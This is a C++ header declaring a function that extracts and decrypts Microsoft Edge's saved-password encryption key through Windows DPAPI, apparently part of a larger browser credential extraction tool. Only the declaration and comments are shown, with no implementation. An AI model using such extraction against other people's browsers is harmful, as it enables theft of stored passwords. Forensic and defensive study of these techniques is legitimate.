// EdgeDPAPI.h - DPAPI operations for Edge password key extraction
#ifndef EDGE_DPAPI_H
#define EDGE_DPAPI_H

#include <Windows.h>
#include <vector>
#include <string>
#include "CommunicationLayer.h"

// Extracts and decrypts Edge password encryption key using Windows DPAPI
// This function runs in the orchestrator's context, avoiding the need for
// COM elevation specifically for Edge password decryption
std::vector<uint8_t> DecryptEdgePasswordKeyWithDPAPI(std::wstring_view localStatePath,
                                                     const Console& console);

#endif // EDGE_DPAPI_H
